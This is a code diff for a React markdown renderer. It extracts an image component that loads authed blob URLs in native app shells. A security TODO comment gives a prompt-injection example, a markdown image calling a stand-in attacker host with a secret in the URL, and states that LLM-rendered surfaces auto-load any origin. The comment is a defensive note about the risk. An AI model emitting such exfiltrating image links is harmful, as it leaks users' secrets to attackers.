@@ -9,6 +9,7 @@
 import React from 'react';
 import type { Components } from 'react-markdown';
 import Image from '../../../embed-shims/next-image';
+import { useAuthedImageSrc } from '../../../hooks/use-authed-image-src';
 import { cn } from '../../../utils/cn';
 import type { ResolveLinkResult } from '../../../types/doc-source';
 import type { TextSizeElement } from './text-size';
@@ -26,6 +27,35 @@ import { slugifyHeadingText } from '../../../utils/markdown-heading-id';
  * the rich composition's `img` / `video` overrides so the empty-`![]()`
  * guard has exactly one definition.
  */
+/**
+ * Inline content image (blog / docs / chat attachments). A standalone
+ * component — NOT inline JSX in the `img` renderer — because it must call
+ * `useAuthedImageSrc`: in bearer-mode native shells (`capacitor://`,
+ * `tauri://`) a gateway-hosted image can't load through a plain `<img>` (no
+ * Authorization header on native asset loads), so the hook swaps in an authed
+ * blob URL; everywhere else it returns `src` untouched. While the blob fetch
+ * is in flight `resolvedSrc` is null and the component renders nothing — same
+ * as the no-src case. Ported from #1548 into the unified engine (the original
+ * lived in the now-deleted `ui/simple-markdown-renderer.tsx`). Sizing matches
+ * the engine's cap: 400x400 intrinsic, `w-auto h-auto max-h-[400px]` drives
+ * the actual rendered box; click-to-expand surfaces provide full resolution.
+ */
+const MarkdownContentImage: React.FC<{ src: string; alt?: string }> = ({ src, alt }) => {
+  const resolvedSrc = useAuthedImageSrc(src);
+  if (!resolvedSrc) return null;
+  return (
+    <Image
+      src={resolvedSrc}
+      alt={alt ?? 'No image available'}
+      width={400}
+      height={400}
+      sizes="(max-width: 400px) 100vw, 400px"
+      className="max-w-full max-h-[400px] w-auto h-auto rounded-lg object-contain"
+      style={{ width: 'auto', height: 'auto' }}
+    />
+  );
+};
+
 export function hasRenderableSrc(src: unknown): src is string {
   return typeof src === 'string' && src.trim() !== '';
 }
@@ -267,11 +297,10 @@ export function buildBaseComponents({
     },
 
     // --- images ---
-    // Inline content image renderer (blog, docs, chat attachments).
-    // CAP at 400x400 with natural-size rendering for small images —
-    // click-to-expand surfaces provide full resolution. Next.js <Image>
-    // via the embed shim gives WebP/AVIF + lazy-loading on Next hosts and
-    // a plain <img> elsewhere.
+    // Inline content image renderer (blog, docs, chat attachments) —
+    // delegates to `MarkdownContentImage` (above), which handles bearer-mode
+    // authed loading for native shells and the 400x400 cap with click-to-
+    // expand for full resolution.
     //
     // TODO(security): LLM-rendered surfaces still auto-load ANY image origin,
     // so a prompt-injected `![](https://attacker/log?d=<secret>)` exfiltrates
@@ -282,17 +311,7 @@ export function buildBaseComponents({
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     img: ({ src, alt }: any) => {
       if (!hasRenderableSrc(src)) return null;
-      return (
-        <Image
-          src={src}
-          alt={alt ?? 'No image available'}
-          width={400}
-          height={400}
-          sizes="(max-width: 400px) 100vw, 400px"
-          className="max-w-full max-h-[400px] w-auto h-auto rounded-lg object-contain"
-          style={{ width: 'auto', height: 'auto' }}
-        />
-      );
+      return <MarkdownContentImage src={src} alt={alt} />;
     },
 
     // --- lists ---
